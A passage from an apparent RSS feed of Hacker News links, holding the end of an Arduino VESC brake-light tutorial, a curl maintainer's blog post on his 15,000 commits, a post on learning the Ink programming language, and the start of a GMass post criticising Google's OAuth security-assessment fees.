2520(this-%253EcommandHandlers%255Bi%255D.commandId%2520%253D%253D%2520commandId)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%255Bi%255D.callback(payload%252C%2520payloadSize)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520DEBUG_PORT.print(%2522Received%2520VESC%2520Packet%253A%2520%2522)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520DEBUG_PORT.println(command)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%2520true%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%2520false%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%257D%250A%250Aprivate%253A%250A%2520%2520%2520%2520HardwareSerial%2520*port%253B%250A%2520%2520%2520%2520vesc_command_handler%2520*commandHandlers%253B%250A%2520%2520%2520%2520uint8_t%2520commandHandlerSize%253B%250A%250A%2520%2520%2520%2520static%2520bool%2520unpackPayload(uint8_t%2520*packet%252C%2520uint16_t%2520length%252C%2520uint8_t%2520*payload)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520crcMessage%2520%253D%25200%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520crcPayload%2520%253D%25200%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520crcMessage%2520%253D%2520packet%255Blength%2520-%25203%255D%2520%253C%253C%25208u%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520crcMessage%2520%2526%253D%25200xFF00u%253B%250A%2520%2520%2520%2520%2520%2520"><img src="https://www.techprowd.com/content/images/2020/09/carbon--26-.png" alt="carbon--26-"></a></p>
<!--kg-card-end: markdown--><h3 id="final-wrap">Final Wrap</h3><p>After having a way to hook into received VESC Commands, it's pretty easy to implement our simple LED dimming logic.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=text%2Fx-c%2B%2Bsrc&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2523include%2520%253CArduino.h%253E%250A%250A%2523define%2520DEBUG_PORT%2520Serial%250A%250A%2523include%2520%2522VescUart.h%2522%250A%250A%2523define%2520LED_DIMMER_PWM%25205%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520LED%2520DIMMER%2520PWM%2520PIN%2520(PWM%2520Compatible%2520PIN)%250A%2523define%2520LED_STATE_ON_POWER%2520HIGH%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520HIGH%252FLOW%2520when%2520power%2520is%2520applied%2520to%2520MCU%250A%2523define%2520LED_BRIGHTNESS_ON_IDLE%2520115%2520%2520%2520%2520%2520%2520%252F%252F%25200-255%2520Brightness%250A%2523define%2520LED_BRIGHTNESS_ON_BRAKE%2520255%2520%2520%2520%2520%2520%252F%252F%25200-255%2520Brightness%250A%250A%2523define%2520THROTTLE_MIDDLE%2520127%250A%250AVescUart%2520*vescUart%253B%250A%250Avoid%2520handleSetChuckDataCommand(uint8_t%2520*payload%252C%2520uint16_t%2520length)%2520%257B%250A%2520%2520%2520%2520uint8_t%2520vescThrottleValue%2520%253D%2520payload%255B2%255D%253B%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520DEBUG_PORT.print(%2522Received%2520new%2520throttle%2520value%253A%2520%2522)%253B%250A%2520%2520%2520%2520DEBUG_PORT.println(vescThrottleValue)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520if%2520(vescThrottleValue%2520%253C%2520THROTTLE_MIDDLE)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_BRAKE)%253B%250A%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_IDLE)%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%250Avoid%2520setup()%2520%257B%250A%2520%2520%2520%2520pinMode(LED_DIMMER_PWM%252C%2520OUTPUT)%253B%250A%250A%2520%2520%2520%2520Serial1.begin(115200)%253B%250A%2520%2520%2520%2520vescUart%2520%253D%2520new%2520VescUart(%2526Serial1)%253B%250A%250A%2520%2520%2520%2520vescUart-%253EaddCommandHandler(COMM_SET_CHUCK_DATA%252C%2520handleSetChuckDataCommand)%253B%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520DEBUG_PORT.begin(9600)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520if%2520(LED_STATE_ON_POWER%2520%253D%253D%2520HIGH)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_IDLE)%253B%250A%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520digitalWrite(LED_DIMMER_PWM%252C%2520LOW)%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%250Avoid%2520loop()%2520%257B%250A%2520%2520%2520%2520vescUart-%253EcheckVescPacket()%253B%250A%257D%250A"><img src="https://www.techprowd.com/content/images/2020/09/carbon--27-.png" alt="carbon--27-"></a></p>
<!--kg-card-end: markdown--><p>Compile and upload the code into Arduino, and it is ready to go.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-78.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-78.png 600w, https://www.techprowd.com/content/images/2020/09/image-78.png 970w" sizes="(min-width: 720px) 720px"></figure><p>You probably thinking, where is the DEMO? You wrote so much code and made a whole article, but there is no demo?</p><p>This project was basically done over the evening. Because of the timezone difference between me and Lithuania is 6 hours, I will not be able to get the demo video, but I will post it on <a href="https://twitter.com/techprowd">@techprowd</a> twitter and update the article after I receive it.</p><p>The final code archive will be uploaded on my <a href="http://patreon.com/techprowd">Patreon</a> for supporters, and I will be able to help with questions regarding how to use it there too!</p><p>I would like to include a shoutout to my father's company and an online store called <a href="https://shop.3dservisas.eu/?utm_source=techprowd">3DServisas</a>. It is primarily oriented to CNC machine custom orders, electric skateboard &amp; mountainboard parts, from gear drives to skateboard trucks.</p><p>If you are interested in building your own electric skateboard or mountainboard, go check out 3DServisas precision gear drives used by many production board makers such as <a href="https://www.bioboards.se/?utm_source=techprowd">BioBoards</a> and DIY players.</p><figure><a href="http://shop.3dservisas.eu/?utm_source=techprowd"><div><p>3DServisas Shop</p><p>CNC Machined goods</p><p><img src="http://cdn.shopify.com/s/files/1/2408/6975/files/3DServisas-logo-1_0_5x_150x150.png?v=1558443632"><span>3DServisas</span></p></div><p><img src="https://cdn.shopify.com/s/files/1/2408/6975/files/logo.png?height=628&amp;pad_color=fff&amp;v=1506788900&amp;width=1200"></p></a></figure><p>Instagram page: <a href="https://www.instagram.com/3dservisas/">https://www.instagram.com/3dservisas/</a></p><h2 id="announcement">Announcement</h2><p>I don't know if you have read my previous articles, but I have opened a Patreon account so you guys could help me by supporting my projects!</p><figure><a href="https://www.patreon.com/techprowd"><div><p>Techprowd is creating articles about software/electronics/cad and other DIY ideas | Patreon</p><p>Patreon is a membership platform that makes it easy for artists and creators to get paid. Join over 200,000 creators earning salaries from over 6 million monthly patrons.</p><p><img src="https://c5.patreon.com/external/favicon/apple-touch-icon.png?v=jw6AR4Rg74"><span>Patreon</span></p></div><p><img src="https://c10.patreonusercontent.com/3/eyJ3Ijo5NjB9/patreon-media/p/campaign/5333287/24fe815b9d214942af49618835ab1447/1.png?token-time=1601769600&amp;token-hash=d-6szlXLAeDC-Z1fx0vSdZvUw7AZpC7CEZ2uYFpFrNw%3D"></p></a></figure><p>If you are not interested in supporting, at least I suggest subscribing to the newsletters down bellow. Every new article will be delivered in a friendly email, readable format straight into your mailbox!</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to techprowd</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517767</guid>
            <pubDate>Fri, 18 Sep 2020 15:12:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first 15,000 curl commits]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24517595">thread link</a>) | @caution
<br/>
September 18, 2020 | https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I’ve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl’s git repository</a> – and we don’t do merge commits so this number doesn’t include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can’t count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I’m only mentioning it here because it’s even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I’ve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of “curl time” per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren’t included in this commit number. For example, I have done over 4,400 commits in curl’s website repository.</p>



<p>With these my first 15,000 commits I’ve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to “modern times”, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I’ve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more “oops” commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#authors"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl’s top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I’ve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won’t start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I’m present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There’s a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>



<figure><a href="https://twitter.com/bagder/status/1302345161272418307"><img loading="lazy" width="825" height="493" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png 825w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-450x269.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-200x120.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-768x459.png 768w" sizes="(max-width: 825px) 100vw, 825px"></a></figure>



<p>I showed these results to my wife. She approved.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517595</guid>
            <pubDate>Fri, 18 Sep 2020 14:59:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning the Ink Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517321">thread link</a>) | @healeycodes
<br/>
September 18, 2020 | https://healeycodes.com/learning-the-ink-programming-language/ | <a href="https://web.archive.org/web/*/https://healeycodes.com/learning-the-ink-programming-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I first heard about the <a href="https://dotink.co/">Ink</a> programming language when I came across <a href="https://github.com/thesephist/polyx">Polyx</a>. Polyx is a productivity suite written in Ink that includes homegrown replacements for Dropbox and Trello as well as a personal relationship manager and a read-it-later service. <a href="https://thesephist.com/">Linus Lee</a> is the sole author of Ink and Polyx. I read through the source code of Polyx because I was interested in owning my own personal infrastructure — and this was the start of my journey with Ink!</p>
<blockquote>
<p>A functional language that takes after modern JavaScript and Go</p>
</blockquote>
<p>Ink exists in the area between a hobby project and a fully grown programming language. It has <a href="https://dotink.co/docs/">documentation</a>, open source <a href="https://dotink.co/docs/projects/">projects</a>, and it’s actively developed with regular releases. It is easy to extend, and the source code is clear and understandable. It’s got warts, sure, but you could write an application with it that gets you a customer and earns you a dollar.</p>
<p>I sent an email to Linus to chat about the language and he pointed me to some of his newer Ink projects that contained the most idiomatic code to learn from (which were <a href="https://github.com/thesephist/september">September</a> and <a href="https://github.com/thesephist/inkfmt">inkfmt</a>). He also fast tracked a planned VS Code <a href="https://github.com/thesephist/ink-vscode">syntax highlighting extension</a> when he found out what editor I was using!</p>
<p>I spent a few weeks learning the language and created <a href="https://inkbyexample.com/">Ink by Example</a> — a hands-on introduction to Ink using annotated example programs. Why was my first major project a learning resource? Well, writing about a topic helps me understand it but trying to teach a topic leads me to the hard questions that build mastery.</p>
<p>With technical topics, you meet the same problems that arise when trying to absorb a book. In <a href="https://andymatuschak.org/books/">Why books don’t work</a>, Andy Matuschak writes:</p>
<blockquote>
<p>Have you ever had a book like this—one you’d read—come up in conversation, only to discover that you’d absorbed what amounts to a few sentences? I’ll be honest: it happens to me regularly. Often things go well at first. I’ll feel I can sketch the basic claims, paint the surface; but when someone asks a basic probing question, the edifice instantly collapses</p>
</blockquote>
<p>Until I explain a topic in a permanent medium (one that exists outside my own head) I don’t know what I don’t know. I fix this by building a structure from the basic principles all the way to the tricky nodes at the end of the graph. This can be via notes, an article, or a project.</p>
<h2 id="building-learning"><a href="#building-learning" aria-label="building learning permalink"></a>Building, Learning</h2>
<p>The best way to learn a language is to build something. Ideally, something that solves a personal problem (this motivation will drive you through the quagmires to victory). The structure of Ink by Example is <del>modelled after</del> stolen from Go by Example.</p>
<p>I enjoy language resources that zoom in on a tiny slice of the syntax and give you clean examples. Usually, this starts with printing to console.</p>
<div data-language="ink"><pre><code>std := load('../vendor/std')
log := std.log

log('hello world')</code></pre></div>
<p>If someone is fluent in another programming language they will want to know how to do <em>X</em> in <em>Y</em>. They seek to translate the building blocks that they’re familiar with; data structures, functions, and system interfaces.</p>
<p>The home page of Ink by Example presumes that you know what question you’re asking. It’s designed for an intermediate programmer.</p>
<p><span>
      <a href="https://healeycodes.com/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Hello World, Values, IO, Loops, Control Flow, Lists, Maps, Functions, Files, HTTP, Random, Sorting, Execing Processes" title="Hello World, Values, IO, Loops, Control Flow, Lists, Maps, Functions, Files, HTTP, Random, Sorting, Execing Processes" src="https://d33wubrfki0l68.cloudfront.net/05b642de4cbf965b2325222a3be889541508e308/f7a04/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png" srcset="https://d33wubrfki0l68.cloudfront.net/96e5028841504f3396b4175c05d816ded6f12913/f3054/static/27460cf041bae463dffa8bab25929dfd/5a46d/list.png 300w,
https://d33wubrfki0l68.cloudfront.net/05b642de4cbf965b2325222a3be889541508e308/f7a04/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png 425w" sizes="(max-width: 425px) 100vw, 425px" loading="lazy">
  </a>
    </span></p>
<p>When building and learning at the same time I like a resource that <em>shows how something works</em>. The ‘how’ — not the ‘why’. A section of code annotated with enough information to get you started. A section of code that you can copy, change two lines, and ship!</p>
<p><span>
      <a href="https://healeycodes.com/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Random example page that explains how rand() and urand() work" title="The Random example page that explains how rand() and urand() work" src="https://d33wubrfki0l68.cloudfront.net/12776e36491c70456781464bfd2e1a46c813a4a0/55c56/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png" srcset="https://d33wubrfki0l68.cloudfront.net/ac7b7b3f1ab05213b586aa2d68f52ae05768e98c/f68c1/static/67e41456d3cd45e1904a481615c03fb8/5a46d/example.png 300w,
https://d33wubrfki0l68.cloudfront.net/c02a29e120f10890078f58281a553fcfbd2a9078/5c915/static/67e41456d3cd45e1904a481615c03fb8/0a47e/example.png 600w,
https://d33wubrfki0l68.cloudfront.net/12776e36491c70456781464bfd2e1a46c813a4a0/55c56/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png 942w" sizes="(max-width: 942px) 100vw, 942px" loading="lazy">
  </a>
    </span></p>
<p>The build tool chain for the project is powered by Ink and the <a href="https://github.com/healeycodes/inkbyexample">repository</a> builds and deploys to Netlify on commits to the main branch. </p>
<p>I set it up to be fairly hackable. There are two HTML templates (bases for index and example) that are imported as strings and formatted with Ink’s <code>std.format</code>. The order that the examples are shown is controlled by <code>examples.ink</code>. The program files are structured like a table with documentation and code in parallel cells.</p>
<p>The program files are turned into executable code and evaluated when the test or build commands are ran. This was useful during development because it gave me full certainty that these code examples actually worked. (Unit tests would have been better!)</p>
<p>The templates are compiled and written to <code>/public</code> as HTML files, along with a few static files like CSS and an <code>og:image</code>.</p>
<p>For syntax highlighting, I read through another Ink project called <a href="https://github.com/thesephist/september">September</a> and saw that it provided a print command that sent Ink source code to the terminal with syntax highlighting via ANSI escape codes. I imported the files required for highlighting and altered the escape code functions to instead wrap the lines in <code>&lt;span&gt;</code> elements with different class names.</p>
<div data-language="ink"><pre><code>` before: if comment, apply ansi.Gray function `
(Tok.Comment) -&gt; Gray

` after: if comment, wrap in span to target via class in HTML `
(Tok.Comment) -&gt; s =&gt; '&lt;span class="c"&gt;' + s + '&lt;/span&gt;'</code></pre></div>
<p>The annotated examples programs are designed to print out a lot of data. This is rendered under the source code as if the file has been ‘ran’ in a terminal to create a natural feel for an intermediate programmer and to show the shape of the data we’re dealing with.</p>
<p><span>
      <a href="https://healeycodes.com/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The section of output under the annotated program as if it has been ran via terminal" title="The section of output under the annotated program as if it has been ran via terminal" src="https://d33wubrfki0l68.cloudfront.net/075b2e15813b85b97af09761104ef85c55c9878c/0e076/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png" srcset="https://d33wubrfki0l68.cloudfront.net/0e54072057bc336bed318e160c9e067e964d5aea/d1983/static/1ff63ca42124214c2cda9a5d999dbfac/5a46d/output.png 300w,
https://d33wubrfki0l68.cloudfront.net/075b2e15813b85b97af09761104ef85c55c9878c/0e076/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png 506w" sizes="(max-width: 506px) 100vw, 506px" loading="lazy">
  </a>
    </span></p>
<p>Since everything builds to a folder called <code>/public</code>, the Netlify configuration is just two lines long. The build time is 17 seconds long.</p>
<div data-language="toml"><pre><code><span>[</span><span>build</span><span>]</span>
  <span>publish</span> <span>=</span> <span>"public/"</span>
  <span>command</span> <span>=</span> <span>"make build-linux"</span></code></pre></div>
<h2 id="why-learn-ink-at-all"><a href="#why-learn-ink-at-all" aria-label="why learn ink at all permalink"></a>Why Learn Ink At All?</h2>
<p>Sometimes I am too career driven in the languages and technologies that I pick up. So I wanted to make sure that I was still learning to explore and be creative — unencumbered by StackOverflow surveys that detail what technologies make you most employable. And what is more esoteric than a language that only two people actively code with (to my knowledge: myself and Linus).</p>
<p>I find Ink enjoyable to write code with. It’s terse, functional, and for small solutions it’s extremely clear to read. Programs are easy to share and deploy; a binary and a script. After reading some of Linus’s passionate <a href="https://dotink.co/posts/">technical articles</a> about Ink I felt an unexplainable yearning to try it out. So I did.</p>
<p>The future of Ink sounds exciting. I caught up with Linus a few days ago and he hinted at an experimental implementation written in Rust. He suggested some language problems that might be fixed too. He also pointed me towards resources on interpreters and compilers which I’ve been devouring. Who knows — maybe I’ll be writing about my own programming language one day soon.</p></section></div>]]>
            </description>
            <link>https://healeycodes.com/learning-the-ink-programming-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517321</guid>
            <pubDate>Fri, 18 Sep 2020 14:38:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WTF: Google’s OAuth verification process and security assessment]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24516706">thread link</a>) | @JaneKCall
<br/>
September 18, 2020 | https://www.gmass.co/blog/google-oauth-verification-security-assessment/ | <a href="https://web.archive.org/web/*/https://www.gmass.co/blog/google-oauth-verification-security-assessment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9167">
	<!-- <header class="entry-header"> -->
					<!-- <div class="entry-meta"> -->
							<!-- </div> -->
			<!-- </header> -->

	
	<div>
		<p>Last October, <a href="https://cloud.google.com/blog/products/g-suite/elevating-user-trust-in-our-api-ecosystems">Google announced that it would start being more stringent</a> with software vendors <strong>building apps on top of the Gmail API</strong>. Specifically,&nbsp;developers using a “restricted” or “sensitive” Gmail API scope would be subject to additional scrutiny and have to pay a fee of $15,000 – $75,000 <em>or more</em> to have a third party security assessment done. GMass leverages the power of the Gmail API to perform its magic, and so GMass has been subject to these measures.</p>
<p>Since Google’s announcement, the web&nbsp;has become rife with stories of frustration amongst smaller companies and independent developers who simply cannot afford the fee.&nbsp;This&nbsp;new policy stands to kill innovation, be the obstacle to side projects, and overall, make Gmail less useful. One of the primary reasons Gmail has been the email platform of choice for startups and tech companies is that it’s been extensible. There are&nbsp;<a href="https://www.producthunt.com/e/apps-for-gmail-email">hundreds, if not thousands,&nbsp;of extensions&nbsp;for Gmail</a>, one of which is GMass, that&nbsp;add functionality and make&nbsp;Gmail more useful than the base product. <em>Most of these applications&nbsp;will disappear.</em> Unless a product has reached the point of business sustainability, it won’t be worth it for most developers to pay the fee and go through the security process (which by the way, will likely cost more than the fee paid, because of development time necessary for remediation).</p>
<p>Well known extensions and Gmail apps like Boomerang, Yesware, Mixmax, and Mailtrack will likely pay the fee and succumb to the new governance, but smaller players like <a href="https://blog.context.io/context-io-deprecation-notice-ce8b77e6e477">Context.io</a> and <a href="https://www.voice2biz.com/oauth-2-0-for-google-apis-3rd-party-audit-costs-require-emailmonkey-to-shutdown/">EmailMonkey have already announced their plans to shut down</a>. I’ve also decided to shut down my other Gmail extension, Wordzen, because the fee is too high to be worth it for Wordzen.</p>
